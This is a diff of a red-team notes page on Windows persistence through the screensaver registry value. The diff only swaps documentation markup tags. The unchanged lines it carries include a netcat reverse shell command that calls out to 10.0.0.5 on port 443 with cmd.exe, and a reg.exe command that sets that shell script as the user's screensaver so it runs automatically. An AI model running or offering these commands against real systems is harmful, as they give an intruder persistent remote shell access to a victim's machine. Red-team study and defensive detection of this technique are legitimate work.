@@ -10,13 +10,13 @@ To achieve persistence, the attacker can modify `SCRNSAVE.EXE` value in the regi
 
 In this test, I will use a netcat reverse shell as my malicious payload:
 
-{% code-tabs %}
-{% code-tabs-item title="c:\\shell.cmd@victim" %}
+{% tabs %}
+{% tab title="c:\\shell.cmd@victim" %}
 ```csharp
 C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Let's update the registry:
 
@@ -24,13 +24,13 @@ Let's update the registry:
 
 The same could be achieved using a native Windows binary reg.exe:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```bash
 reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d c:\shell.cmd
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screensaver-reg.png)
 
